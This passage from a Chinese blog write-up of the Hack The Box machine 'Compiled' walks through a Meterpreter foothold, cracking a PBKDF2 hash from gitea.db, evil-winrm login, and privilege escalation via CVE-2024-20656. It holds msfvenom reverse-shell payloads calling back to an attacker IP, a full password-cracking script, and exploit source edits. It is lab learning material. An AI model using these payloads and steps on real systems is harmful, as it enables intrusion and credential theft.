+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62431f21886ccc0a0a36b.jpg" data-fancybox="true" alt="Compiled-14" />
+
+<hr>
+<h3 id="Msf上线"><a href="#Msf上线" class="headerlink" title="Msf上线"></a>Msf上线</h3><p>在翻看其他师傅的Write-up的时候发现有师傅是使用Msf上线的，结合后续的操作，其实使用Msf上线是最一步到位的操作，因为前文所反弹回来的Shell并没有下载的功能，只能再生成一个Msf马传上去上线再下载，所以不如在这一步就一步到位上线Msf；前面操作都一样，依旧创建两个空仓库，我这选3和4，图中我已经完成上传了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cdb7.jpg" data-fancybox="true" alt="Compiled-15" />
+
+<p>然后我们需要修改一下POC的脚本，除了改仓库的链接外，还需要将我们的反弹Shell更改成Msf生成的Shellcode：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.23 LPORT=44301 -f psh-cmd</span><br></pre></td></tr></table></figure>
+
+<p>改好后运行即可，编译的那个网站提交repo4的链接即可，步骤跟前面都一样，同时Msf里需要开启监听，稍等一会即可上线：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd5e.jpg" data-fancybox="true" alt="Compiled-16" />
+
+<hr>
+<h2 id="4-获取User-txt"><a href="#4-获取User-txt" class="headerlink" title="4.获取User.txt"></a>4.获取User.txt</h2><p>上线之后自然就要开展新一轮的信息收集了，先看看用户：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd73.jpg" data-fancybox="true" alt="Compiled-17" />
+
+<p>有一个Emily，我们目前显然是Richard，瞅一眼桌面，好的，没有Flag，那下一步的方向就是这个Emily了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd88.jpg" data-fancybox="true" alt="Compiled-18" />
+
+<p>先给出结论：在C:\Program Files\Gitea\data里面有一个gitea.db，里面有Emily的密码：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62463f21886ccc0a0cd9d.jpg" data-fancybox="true" alt="Compiled-19" />
+
+<p>哈？你问我怎么知道的，<del>显然是看Write-up啦</del>，咳咳，Windows中一般来说Program Files或者Program Files（x86）都是默认的安装位置，平常想必各位也有发觉，所以一般来说审计的重点就在这两个目录中。将gitea.db下载到Kali，再传到本机用Navicat打开：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb0e.jpg" data-fancybox="true" alt="Compiled-20" />
+
+<p>可以看到这一串东西，<em>忽略我的邮箱为啥跟我之前注册的不一样，图是之前截的</em>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16</span><br></pre></td></tr></table></figure>
+
+<p>显示是pbkdf2$50000$50加密：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb21.jpg" data-fancybox="true" alt="Compiled-21" />
+
+<p>还给了盐值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb32.jpg" data-fancybox="true" alt="Compiled-22" />
+
+<p>确定了算法、盐值，编写爆破脚本就完事，自己写的话可以求助G老师。我这就直接搬Write-up的了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pbkdf2_hash</span>(<span class="params">password, salt, iterations=<span class="number">50000</span>, dklen=<span class="number">50</span></span>):</span><br><span class="line">    hash_value = hashlib.pbkdf2_hmac(</span><br><span class="line">        <span class="string">&#x27;sha256&#x27;</span>,  <span class="comment"># hashing algorithm</span></span><br><span class="line">        password.encode(<span class="string">&#x27;utf-8&#x27;</span>),  <span class="comment"># password</span></span><br><span class="line">        salt,  <span class="comment"># salt</span></span><br><span class="line">        iterations,  <span class="comment"># number of iterations</span></span><br><span class="line">        dklen=dklen  <span class="comment"># key length</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_password</span>(<span class="params">dictionary_file, target_hash, salt, iterations=<span class="number">50000</span>, dklen=<span class="number">50</span></span>):</span><br><span class="line">   </span><br><span class="line">    target_hash_bytes = binascii.unhexlify(target_hash)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">           </span><br><span class="line">            password = line.strip()</span><br><span class="line">           </span><br><span class="line">            <span class="comment"># generating hash</span></span><br><span class="line">            hash_value = pbkdf2_hash(password, salt, iterations, dklen)</span><br><span class="line">           </span><br><span class="line">            <span class="comment"># Check if hash is correct</span></span><br><span class="line">            <span class="keyword">if</span> hash_value == target_hash_bytes:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> password</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Password not found.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Parameters</span></span><br><span class="line">salt = binascii.unhexlify(<span class="string">&#x27;227d873cca89103cd83a976bdac52486&#x27;</span>)  <span class="comment"># Salt from gitea.db</span></span><br><span class="line">target_hash = <span class="string">&#x27;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16&#x27;</span> <span class="comment"># hash from gitea.db</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Patch to dictionary</span></span><br><span class="line"><span class="comment"># 记得改这里字典的路径</span></span><br><span class="line">dictionary_file = <span class="string">&#x27;/usr/local/Dict/rockyou.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">find_matching_password(dictionary_file, target_hash, salt)</span><br></pre></td></tr></table></figure>
+
+<p>爆破出来密码是<code>12345678</code>，十分简单哈- -：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb3c.jpg" data-fancybox="true" alt="Compiled-23" />
+
+<p>密码有了，接下来就是登录Emily的账号了，这里又学到了一个新东西：<strong>Evil-winrm</strong>：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6249cf21886ccc0a0fb4d.jpg" data-fancybox="true" alt="Compiled-24" />
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.26 -u emily -p 12345678</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62510f21886ccc0a15ccd.jpg" data-fancybox="true" alt="Compiled-25" />
+
+<p>成功登录，Flag在C:\Users\Emily\Desktop下：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62510f21886ccc0a15cda.jpg" data-fancybox="true" alt="Compiled-26" />
+
+<hr>
+<h2 id="5-获取Root-txt（CVE-2024-20656复现）"><a href="#5-获取Root-txt（CVE-2024-20656复现）" class="headerlink" title="5.获取Root.txt（CVE-2024-20656复现）"></a>5.获取Root.txt（CVE-2024-20656复现）</h2><p>接上文，普通用户Flag已获取，下一步就是提权了，这个靶机有个好处，打Root部分的时候不需要再重复前面的动作，我们已经获取到Emily的密码了，如果后续环境崩了还是啥的，直接Evil-winrm登录即可。</p>
+<p>登录到Emily时，查看当前目录就发现了VS2019，那应该就是它的漏洞喽：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62510f21886ccc0a15ce5.jpg" data-fancybox="true" alt="Compiled-27" />
+
+<p>虽然很不想承认，但是搜漏洞真的不能用中文&#x3D; &#x3D;：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62510f21886ccc0a15cf5.jpg" data-fancybox="true" alt="Compiled-28" />
+
+<blockquote>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/">https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/</a></p>
+</blockquote>
+<p>锁定漏洞CVE-2024-20656，Github上有<a target="_blank" rel="noopener" href="https://github.com/Wh04m1001/CVE-2024-20656">POC</a>，这个POC需要下载到本地用VS2019来编译才行，其中有几个坑点值得注意一下，先clone到本地；要运用这个POC我们需要准备三个exe，分别是该POC编译生成的Expl.exe、Msf生成的木马Shell.exe、以及确保Expl能在靶机中正常运行的RunasCs.exe；我们先一个一个来：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Wh04m1001/CVE-2024-20656.git</span><br></pre></td></tr></table></figure>
+
+<p>根据参考文章和Write-up，需要改两处地方，首先先加载项目，注意是选这个选项：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f62510f21886ccc0a15cfd.jpg" data-fancybox="true" alt="Compiled-29" style="zoom:67%;" />
+
+<p>选这个文件：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6253cf21886ccc0a18a32.jpg" data-fancybox="true" alt="Compiled-30" style="zoom: 67%;" />
+
+<p>打开项目后长这样：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6253cf21886ccc0a189f6.jpg" data-fancybox="true" alt="Compiled-31" />
+
+<p>需要改main.cpp中的第4行和第187行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第4行</span></span><br><span class="line">WCHAR cmd[] = L&quot;C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe&quot;;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第187行</span></span><br><span class="line">CopyFile(L&quot;C:\\tmp\\Shell.exe&quot;, L&quot;C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe&quot;, FALSE);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>需要注意，第4行的那个路径是靶机中VSDiagnostics.exe的路径，不是本机的，这是一个坑点；第187行前段的路径是你反弹Shell木马的路径；改好后长这样：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6253cf21886ccc0a18a02.jpg" data-fancybox="true" alt="Compiled-32" />
+
+<hr>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f627d2f21886ccc0a3f31e.jpg" data-fancybox="true" alt="Compiled-33" />
+
+<p>然后是编译，我们需要用Release选项来编译，并且确保工具集是2019的版本：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f6253cf21886ccc0a18a1f.jpg" data-fancybox="true" alt="Compiled-34" />
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0ca.jpg" data-fancybox="true" alt="Compiled-35" />
+
+<p>这些步骤都没错的话，选择开始执行：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0d7.jpg" data-fancybox="true" alt="Compiled-36" />
+
+<p>执行完会弹出个框，长这样，不要慌，文件是正常生成的，去对应的目录找就行：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0eb.jpg" data-fancybox="true" alt="Compiled-37" />
+
+<p>Expl.exe就制作完了，再把Shell.exe生成一下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.16.23 lport=65205 -f exe &gt; /tmp/Shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>还要去Github下载一下<a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs/releases/tag/v1.5">RunasCs.exe</a>：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625a7f21886ccc0a1f0ae.jpg" data-fancybox="true" alt="Compiled-39" />
+
+<p>三个程序都准备好后，利用Python的临时Http服务上传到靶机:</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625d1f21886ccc0a21730.jpg" data-fancybox="true" alt="Compiled-40" style="zoom:80%;" />
+
+<p>同时启用Msf的监听：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625d1f21886ccc0a21738.jpg" data-fancybox="true" alt="Compiled-41" />
+
+<blockquote>
+<p>这里要注意，每次启用监听模块我们一定要指定对应payload，否则监听不到：</p>
+<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
+</blockquote>
+<p>接下来利用RunasCs来启动Expl即可反弹Shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe emily 12345678 C:\tmp\Expl.exe</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625d1f21886ccc0a2176d.jpg" data-fancybox="true" alt="Compiled-42" />
+
+<p>Root.txt就在C:\Users\Administrator\Desktop里：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic.imgdb.cn/item/66f625d1f21886ccc0a2177a.jpg" data-fancybox="true" alt="Compiled-43" />
+
+<p>至此，所有Flag已获取，打靶结束！</p>
+<hr>
+<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><ul>
+<li>整个靶场打下来用了三天，涉及的两个漏洞复现起来都挺吃力的，Git的那个尝试理解着改脚本改了一下午；VS的那个漏洞第四行没有理解明白，卡了我一天，最后还是请教了<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gwAvnAYxixKnZwUT7n9pxw">羽泪云小栈</a>师傅才整明白的T T；两个漏洞的原理都没太理解明白，不过跟着教程复现出来也是很有收获的，方方面面都加深了一些理解。靶场的质量还是很不错的！后面有其他理解了我再补充吧！</li>
+<li>参考文章：<ul>
+<li><a target="_blank" rel="noopener" href="https://www.hyhforever.top/htb-compiled/">https://www.hyhforever.top/htb-compiled/</a></li>
+<li><a target="_blank" rel="noopener" href="https://natro92.fun/posts/be13f570/#SYSTEM">https://natro92.fun/posts/be13f570/#SYSTEM</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KKi1Ie6UoyAMCFTTB5QBmA">https://mp.weixin.qq.com/s/KKi1Ie6UoyAMCFTTB5QBmA</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gwAvnAYxixKnZwUT7n9pxw">https://mp.weixin.qq.com/s/gwAvnAYxixKnZwUT7n9pxw</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Kp1MBI2NLuWPlvJWnLZIxA">https://mp.weixin.qq.com/s/Kp1MBI2NLuWPlvJWnLZIxA</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rrnd3QKSC_vdW0DYVkvSDA">https://mp.weixin.qq.com/s/rrnd3QKSC_vdW0DYVkvSDA</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hx3TUw3Zh0GWX3uH1jtTaQ">https://mp.weixin.qq.com/s/hx3TUw3Zh0GWX3uH1jtTaQ</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/">https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/</a></li>
+<li><a target="_blank" rel="noopener" href="https://amalmurali.me/posts/git-rce/">https://amalmurali.me/posts/git-rce/</a></li>
+</ul>
+</li>
+</ul>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/09/24/HTB-MonitorsThree_Write-up/">HTB-MonitorsThree_Write-up</a></div></section></div>
+
+
+
+
+
+
